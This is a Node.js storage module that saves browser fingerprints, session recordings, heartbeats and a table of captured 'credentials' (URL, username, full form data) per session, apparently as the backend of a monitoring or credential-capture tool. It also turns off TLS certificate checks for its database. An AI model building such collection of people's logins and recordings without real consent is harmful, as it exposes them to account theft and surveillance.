import { readFile, writeFile, mkdir, unlink, readdir } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const root = fileURLToPath(new URL('.', import.meta.url));
const dataDir = process.env.DATA_DIR || join(root, 'data');
const recordingsDir = join(dataDir, 'recordings');

async function readJsonSafe(filePath, defaultValue) {
  try {
    if (!existsSync(filePath)) return defaultValue;
    const content = await readFile(filePath, 'utf8');
    return JSON.parse(content || '[]');
  } catch (err) {
    console.error(`[STORAGE-FILE] Error reading ${filePath}:`, err.message);
    return defaultValue;
  }
}

async function writeJsonSafe(filePath, data) {
  try {
    await writeFile(filePath, JSON.stringify(data, null, 2), 'utf8');
  } catch (err) {
    console.error(`[STORAGE-FILE] Error writing ${filePath}:`, err.message);
  }
}

export class FileStorage {
  constructor() {
    this.reportsPath = join(dataDir, 'reports.json');
    this.auditEventsPath = join(dataDir, 'audit_events.json');
    this.recordingsPath = join(dataDir, 'recordings.json');
    this.credentialsPath = join(dataDir, 'credentials.json');
    this.heartbeatsPath = join(dataDir, 'heartbeats.json');

    this.reports = [];
    this.auditEvents = [];
    this.recordings = [];
    this.credentials = [];
    this.heartbeats = [];

    this.nextReportId = 0;
    this.nextAuditEventId = 0;
    this.nextRecordingId = 0;
    this.nextCredentialId = 0;
    this.nextHeartbeatId = 0;
  }

  async init() {
    try {
      await mkdir(dataDir, { recursive: true });
      await mkdir(recordingsDir, { recursive: true });

      this.reports = await readJsonSafe(this.reportsPath, []);
      this.auditEvents = await readJsonSafe(this.auditEventsPath, []);
      this.recordings = await readJsonSafe(this.recordingsPath, []);
      this.credentials = await readJsonSafe(this.credentialsPath, []);
      this.heartbeats = await readJsonSafe(this.heartbeatsPath, []);

      this.nextReportId = this.reports.reduce((max, r) => Math.max(max, Number(r.id) || 0), 0);
      this.nextAuditEventId = this.auditEvents.reduce((max, e) => Math.max(max, Number(e.id) || 0), 0);
      this.nextRecordingId = this.recordings.reduce((max, r) => Math.max(max, Number(r.id) || 0), 0);
      this.nextCredentialId = this.credentials.reduce((max, c) => Math.max(max, Number(c.id) || 0), 0);
      this.nextHeartbeatId = this.heartbeats.reduce((max, h) => Math.max(max, Number(h.id) || 0), 0);

      console.log(`[STORAGE-FILE] Initialized in ${dataDir}. Reports: ${this.reports.length}, Recordings: ${this.recordings.length}, Credentials: ${this.credentials.length}, Heartbeats: ${this.heartbeats.length}`);
      return true;
    } catch (err) {
      console.error('[STORAGE-FILE] Failed to initialize directory:', err.message);
      return false;
    }
  }

  async saveReport({ fingerprint, events, consentVersion }) {
    const id = ++this.nextReportId;
    const createdAt = new Date().toISOString();
    const item = {
      id,
      created_at: createdAt,
      fingerprint,
      event_count: Array.isArray(events) ? events.length : 0,
      consent_version: consentVersion
    };

    this.reports.unshift(item);
    if (this.reports.length > 500) this.reports = this.reports.slice(0, 500);
    await writeJsonSafe(this.reportsPath, this.reports);

    if (Array.isArray(events) && events.length > 0) {
      for (const ev of events.slice(-100)) {
        if (ev && typeof ev.label === 'string' && typeof ev.detail === 'string') {
          this.auditEvents.push({
            id: ++this.nextAuditEventId,
            created_at: createdAt,
            report_id: id,
            event_type: ev.label.slice(0, 120),
            detail: ev.detail.slice(0, 240)
          });
        }
      }
      if (this.auditEvents.length > 2000) this.auditEvents = this.auditEvents.slice(-2000);
      await writeJsonSafe(this.auditEventsPath, this.auditEvents);
    }

    return { id, createdAt };
  }

  async getReports(limit = 200) {
    return this.reports.slice(0, limit);
  }

  async getReport(id) {
    return this.reports.find((r) => String(r.id) === String(id)) || null;
  }

  async deleteReport(id) {
    const initialLen = this.reports.length;
    this.reports = this.reports.filter((r) => String(r.id) !== String(id));
    if (this.reports.length !== initialLen) {
      this.auditEvents = this.auditEvents.filter((e) => String(e.report_id) !== String(id));
      await writeJsonSafe(this.reportsPath, this.reports);
      await writeJsonSafe(this.auditEventsPath, this.auditEvents);
      return true;
    }
    return false;
  }

  async deleteAllReports() {
    const count = this.reports.length;
    this.reports = [];
    this.auditEvents = [];
    await writeJsonSafe(this.reportsPath, this.reports);
    await writeJsonSafe(this.auditEventsPath, this.auditEvents);
    return count;
  }

  async saveRecording({ mimeType, data, consentVersion }) {
    const id = ++this.nextRecordingId;
    const createdAt = new Date().toISOString();
    const filename = `${id}.webm`;
    const filePath = join(recordingsDir, filename);

    await writeFile(filePath, data);

    const item = {
      id,
      created_at: createdAt,
      mime_type: mimeType,
      bytes: data.length,
      consent_version: consentVersion,
      filename
    };

    this.recordings.unshift(item);
    if (this.recordings.length > 200) this.recordings = this.recordings.slice(0, 200);
    await writeJsonSafe(this.recordingsPath, this.recordings);

    return { id, createdAt };
  }

  async getRecordings(limit = 200) {
    return this.recordings.slice(0, limit).map((r) => ({
      id: r.id,
      created_at: r.created_at,
      mime_type: r.mime_type,
      bytes: r.bytes,
      consent_version: r.consent_version
    }));
  }

  async getRecording(id) {
    const item = this.recordings.find((r) => String(r.id) === String(id));
    if (!item) return null;
    const filePath = join(recordingsDir, item.filename);
    if (!existsSync(filePath)) return null;
    const data = await readFile(filePath);
    return { mime_type: item.mime_type, data };
  }

  async deleteRecording(id) {
    const idx = this.recordings.findIndex((r) => String(r.id) === String(id));
    if (idx === -1) return false;
    const [item] = this.recordings.splice(idx, 1);
    const filePath = join(recordingsDir, item.filename);
    try {
      if (existsSync(filePath)) await unlink(filePath);
    } catch {}
    await writeJsonSafe(this.recordingsPath, this.recordings);
    return true;
  }

  async deleteAllRecordings() {
    const count = this.recordings.length;
    for (const item of this.recordings) {
      try {
        const filePath = join(recordingsDir, item.filename);
        if (existsSync(filePath)) await unlink(filePath);
      } catch {}
    }
    this.recordings = [];
    await writeJsonSafe(this.recordingsPath, this.recordings);
    return count;
  }

  async saveCredential({ sessionId, url, username, formData }) {
    const id = ++this.nextCredentialId;
    const createdAt = new Date().toISOString();
    const item = {
      id,
      created_at: createdAt,
      session_id: sessionId,
      url,
      username,
      form_data: formData
    };

    this.credentials.unshift(item);
    if (this.credentials.length > 500) this.credentials = this.credentials.slice(0, 500);
    await writeJsonSafe(this.credentialsPath, this.credentials);
    return { id, createdAt };
  }

  async getCredentials(limit = 200) {
    return this.credentials.slice(0, limit).map((c) => ({
      id: c.id,
      created_at: c.created_at,
      session_id: c.session_id,
      url: c.url,
      username: c.username
    }));
  }

  async deleteCredential(id) {
    const initialLen = this.credentials.length;
    this.credentials = this.credentials.filter((c) => String(c.id) !== String(id));
    if (this.credentials.length !== initialLen) {
      await writeJsonSafe(this.credentialsPath, this.credentials);
      return true;
    }
    return false;
  }

  async deleteAllCredentials() {
    const count = this.credentials.length;
    this.credentials = [];
    await writeJsonSafe(this.credentialsPath, this.credentials);
    return count;
  }

  async saveHeartbeat({ sessionId, state }) {
    const id = ++this.nextHeartbeatId;
    const createdAt = new Date().toISOString();
    const item = {
      id,
      created_at: createdAt,
      session_id: sessionId,
      state
    };

    this.heartbeats.unshift(item);
    if (this.heartbeats.length > 500) this.heartbeats = this.heartbeats.slice(0, 500);
    await writeJsonSafe(this.heartbeatsPath, this.heartbeats);
    return { id, createdAt };
  }

  async getHeartbeats(limit = 200) {
    return this.heartbeats.slice(0, limit).map((h) => ({
      id: h.id,
      created_at: h.created_at,
      session_id: h.session_id,
      state: h.state
    }));
  }

  async deleteHeartbeat(id) {
    const initialLen = this.heartbeats.length;
    this.heartbeats = this.heartbeats.filter((h) => String(h.id) !== String(id));
    if (this.heartbeats.length !== initialLen) {
      await writeJsonSafe(this.heartbeatsPath, this.heartbeats);
      return true;
    }
    return false;
  }

  async deleteAllHeartbeats() {
    const count = this.heartbeats.length;
    this.heartbeats = [];
    await writeJsonSafe(this.heartbeatsPath, this.heartbeats);
    return count;
  }
}

export class PostgresStorage {
  constructor(databaseUrl) {
    this.databaseUrl = databaseUrl;
    this.pool = null;
    this.connected = false;
  }

  async init() {
    if (!this.databaseUrl) return false;
    try {
      const { default: pg } = await import('pg');
      this.pool = new pg.Pool({
        connectionString: this.databaseUrl,
        ssl: { rejectUnauthorized: false },
        max: 5,
        connectionTimeoutMillis: 5000,
        idleTimeoutMillis: 10000
      });

      this.pool.on('error', (err) => {
        console.error('[STORAGE-PG] Idle pool client error:', err.message);
      });

      const schema = `
        CREATE TABLE IF NOT EXISTS reports (
          id BIGSERIAL PRIMARY KEY,
          created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
          fingerprint JSONB NOT NULL,
          event_count INTEGER NOT NULL DEFAULT 0,
          consent_version TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS audit_events (
          id BIGSERIAL PRIMARY KEY,
          created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
          report_id BIGINT REFERENCES reports(id) ON DELETE CASCADE,
          event_type TEXT NOT NULL,
          detail TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS recordings (
          id BIGSERIAL PRIMARY KEY,
          created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
          mime_type TEXT NOT NULL,
          duration_ms INTEGER,
          data BYTEA NOT NULL,
          consent_version TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS heartbeats (
          id BIGSERIAL PRIMARY KEY,
          created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
          session_id TEXT NOT NULL,
          state JSONB NOT NULL
        );
        CREATE TABLE IF NOT EXISTS credentials (
          id BIGSERIAL PRIMARY KEY,
          created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
          session_id TEXT NOT NULL,
          url TEXT NOT NULL,
          username TEXT,
          form_data JSONB
        );
      `;

      await Promise.race([
        this.pool.query(schema),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timed out after 5000ms')), 5000))
      ]);

      this.connected = true;
      console.log('[STORAGE-PG] PostgreSQL connected and initialized successfully.');
      return true;
    } catch (err) {
      console.warn(`[STORAGE-PG] PostgreSQL connection failed: ${err.message}`);
      if (this.pool) {
        try { await this.pool.end(); } catch {}
        this.pool = null;
      }
      this.connected = false;
      return false;
    }
  }

  async saveReport({ fingerprint, events, consentVersion }) {
    const client = await this.pool.connect();
    try {
      await client.query('BEGIN');
      const saved = await client.query(
        'INSERT INTO reports (fingerprint, event_count, consent_version) VALUES ($1, $2, $3) RETURNING id, created_at',
        [fingerprint, Array.isArray(events) ? events.length : 0, consentVersion]
      );
      const reportId = saved.rows[0].id;
      for (const event of Array.isArray(events) ? events.slice(-100) : []) {
        if (event && typeof event.label === 'string' && typeof event.detail === 'string') {
          await client.query(
            'INSERT INTO audit_events (report_id, event_type, detail) VALUES ($1, $2, $3)',
            [reportId, event.label.slice(0, 120), event.detail.slice(0, 240)]
          );
        }
      }
      await client.query('COMMIT');
      return { id: reportId, createdAt: saved.rows[0].created_at };
    } catch (error) {
      await client.query('ROLLBACK');
      throw error;
    } finally {
      client.release();
    }
  }

  async getReports(limit = 200) {
    const result = await this.pool.query(
      'SELECT id, created_at, fingerprint, event_count, consent_version FROM reports ORDER BY created_at DESC LIMIT $1',
      [limit]
    );
    return result.rows;
  }

  async getReport(id) {
    const result = await this.pool.query(
      'SELECT id, created_at, fingerprint, event_count, consent_version FROM reports WHERE id = $1',
      [id]
    );
    return result.rows[0] || null;
  }

  async deleteReport(id) {
    const result = await this.pool.query('DELETE FROM reports WHERE id = $1 RETURNING id', [id]);
    return result.rowCount > 0;
  }

  async deleteAllReports() {
    const result = await this.pool.query('DELETE FROM reports');
    return result.rowCount;
  }

  async saveRecording({ mimeType, data, consentVersion }) {
    const saved = await this.pool.query(
      'INSERT INTO recordings (mime_type, data, consent_version) VALUES ($1, $2, $3) RETURNING id, created_at',
      [mimeType, data, consentVersion]
    );
    return { id: saved.rows[0].id, createdAt: saved.rows[0].created_at };
  }

  async getRecordings(limit = 200) {
    const result = await this.pool.query(
      'SELECT id, created_at, mime_type, octet_length(data) AS bytes, consent_version FROM recordings ORDER BY created_at DESC LIMIT $1',
      [limit]
    );
    return result.rows;
  }

  async getRecording(id) {
    const result = await this.pool.query('SELECT mime_type, data FROM recordings WHERE id = $1', [id]);
    return result.rows[0] || null;
  }

  async deleteRecording(id) {
    const result = await this.pool.query('DELETE FROM recordings WHERE id = $1 RETURNING id', [id]);
    return result.rowCount > 0;
  }

  async deleteAllRecordings() {
    const result = await this.pool.query('DELETE FROM recordings');
    return result.rowCount;
  }

  async saveCredential({ sessionId, url, username, formData }) {
    await this.pool.query(
      'INSERT INTO credentials (session_id, url, username, form_data) VALUES ($1, $2, $3, $4)',
      [sessionId, String(url || '').slice(0, 500), String(username || '').slice(0, 200), JSON.stringify(formData || {})]
    );
    return { ok: true };
  }

  async getCredentials(limit = 200) {
    const result = await this.pool.query(
      'SELECT id, created_at, session_id, url, username FROM credentials ORDER BY created_at DESC LIMIT $1',
      [limit]
    );
    return result.rows;
  }

  async deleteCredential(id) {
    const result = await this.pool.query('DELETE FROM credentials WHERE id = $1 RETURNING id', [id]);
    return result.rowCount > 0;
  }

  async deleteAllCredentials() {
    const result = await this.pool.query('DELETE FROM credentials');
    return result.rowCount;
  }

  async saveHeartbeat({ sessionId, state }) {
    await this.pool.query(
      'INSERT INTO heartbeats (session_id, state) VALUES ($1, $2)',
      [sessionId, JSON.stringify(state || {})]
    );
    return { ok: true };
  }

  async getHeartbeats(limit = 200) {
    const result = await this.pool.query(
      'SELECT id, created_at, session_id, state FROM heartbeats ORDER BY created_at DESC LIMIT $1',
      [limit]
    );
    return result.rows;
  }

  async deleteHeartbeat(id) {
    const result = await this.pool.query('DELETE FROM heartbeats WHERE id = $1 RETURNING id', [id]);
    return result.rowCount > 0;
  }

  async deleteAllHeartbeats() {
    const result = await this.pool.query('DELETE FROM heartbeats');
    return result.rowCount;
  }
}

export class StorageManager {
  constructor() {
    this.databaseUrl = process.env.DATABASE_URL;
    this.postgres = null;
    this.file = null;
    this.mode = 'file';
  }

  async init() {
    this.file = new FileStorage();
    await this.file.init();

    if (this.databaseUrl) {
      console.log('[STORAGE] DATABASE_URL detected, attempting PostgreSQL connection...');
      this.postgres = new PostgresStorage(this.databaseUrl);
      const ok = await this.postgres.init();
      if (ok) {
        this.mode = 'postgres';
        return;
      }
      console.warn('[STORAGE] PostgreSQL is unavailable (expired, paused, or invalid URL). Gracefully operating in local persistent FileStorage mode.');
    } else {
      console.log('[STORAGE] No DATABASE_URL provided. Operating in local persistent FileStorage mode.');
    }
    this.mode = 'file';
  }

  getType() {
    return this.mode;
  }

  isDatabaseConnected() {
    return this.mode === 'postgres' && Boolean(this.postgres?.connected);
  }

  async saveReport(params) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.saveReport(params);
      } catch (err) {
        console.error('[STORAGE-PG] saveReport error, falling back to file:', err.message);
        return await this.file.saveReport(params);
      }
    }
    return await this.file.saveReport(params);
  }

  async getReports(limit) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.getReports(limit);
      } catch (err) {
        console.error('[STORAGE-PG] getReports error, falling back to file:', err.message);
        return await this.file.getReports(limit);
      }
    }
    return await this.file.getReports(limit);
  }

  async getReport(id) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.getReport(id);
      } catch (err) {
        console.error('[STORAGE-PG] getReport error, falling back to file:', err.message);
        return await this.file.getReport(id);
      }
    }
    return await this.file.getReport(id);
  }

  async deleteReport(id) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.deleteReport(id);
      } catch (err) {
        console.error('[STORAGE-PG] deleteReport error, falling back to file:', err.message);
        return await this.file.deleteReport(id);
      }
    }
    return await this.file.deleteReport(id);
  }

  async deleteAllReports() {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.deleteAllReports();
      } catch (err) {
        console.error('[STORAGE-PG] deleteAllReports error, falling back to file:', err.message);
        return await this.file.deleteAllReports();
      }
    }
    return await this.file.deleteAllReports();
  }

  async saveRecording(params) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.saveRecording(params);
      } catch (err) {
        console.error('[STORAGE-PG] saveRecording error, falling back to file:', err.message);
        return await this.file.saveRecording(params);
      }
    }
    return await this.file.saveRecording(params);
  }

  async getRecordings(limit) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.getRecordings(limit);
      } catch (err) {
        console.error('[STORAGE-PG] getRecordings error, falling back to file:', err.message);
        return await this.file.getRecordings(limit);
      }
    }
    return await this.file.getRecordings(limit);
  }

  async getRecording(id) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.getRecording(id);
      } catch (err) {
        console.error('[STORAGE-PG] getRecording error, falling back to file:', err.message);
        return await this.file.getRecording(id);
      }
    }
    return await this.file.getRecording(id);
  }

  async deleteRecording(id) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.deleteRecording(id);
      } catch (err) {
        console.error('[STORAGE-PG] deleteRecording error, falling back to file:', err.message);
        return await this.file.deleteRecording(id);
      }
    }
    return await this.file.deleteRecording(id);
  }

  async deleteAllRecordings() {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.deleteAllRecordings();
      } catch (err) {
        console.error('[STORAGE-PG] deleteAllRecordings error, falling back to file:', err.message);
        return await this.file.deleteAllRecordings();
      }
    }
    return await this.file.deleteAllRecordings();
  }

  async saveCredential(params) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.saveCredential(params);
      } catch (err) {
        console.error('[STORAGE-PG] saveCredential error, falling back to file:', err.message);
        return await this.file.saveCredential(params);
      }
    }
    return await this.file.saveCredential(params);
  }

  async getCredentials(limit) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.getCredentials(limit);
      } catch (err) {
        console.error('[STORAGE-PG] getCredentials error, falling back to file:', err.message);
        return await this.file.getCredentials(limit);
      }
    }
    return await this.file.getCredentials(limit);
  }

  async deleteCredential(id) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.deleteCredential(id);
      } catch (err) {
        console.error('[STORAGE-PG] deleteCredential error, falling back to file:', err.message);
        return await this.file.deleteCredential(id);
      }
    }
    return await this.file.deleteCredential(id);
  }

  async deleteAllCredentials() {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.deleteAllCredentials();
      } catch (err) {
        console.error('[STORAGE-PG] deleteAllCredentials error, falling back to file:', err.message);
        return await this.file.deleteAllCredentials();
      }
    }
    return await this.file.deleteAllCredentials();
  }

  async saveHeartbeat(params) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.saveHeartbeat(params);
      } catch (err) {
        console.error('[STORAGE-PG] saveHeartbeat error, falling back to file:', err.message);
        return await this.file.saveHeartbeat(params);
      }
    }
    return await this.file.saveHeartbeat(params);
  }

  async getHeartbeats(limit) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.getHeartbeats(limit);
      } catch (err) {
        console.error('[STORAGE-PG] getHeartbeats error, falling back to file:', err.message);
        return await this.file.getHeartbeats(limit);
      }
    }
    return await this.file.getHeartbeats(limit);
  }

  async deleteHeartbeat(id) {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.deleteHeartbeat(id);
      } catch (err) {
        console.error('[STORAGE-PG] deleteHeartbeat error, falling back to file:', err.message);
        return await this.file.deleteHeartbeat(id);
      }
    }
    return await this.file.deleteHeartbeat(id);
  }

  async deleteAllHeartbeats() {
    if (this.mode === 'postgres') {
      try {
        return await this.postgres.deleteAllHeartbeats();
      } catch (err) {
        console.error('[STORAGE-PG] deleteAllHeartbeats error, falling back to file:', err.message);
        return await this.file.deleteAllHeartbeats();
      }
    }
    return await this.file.deleteAllHeartbeats();
  }
}

export const storage = new StorageManager();
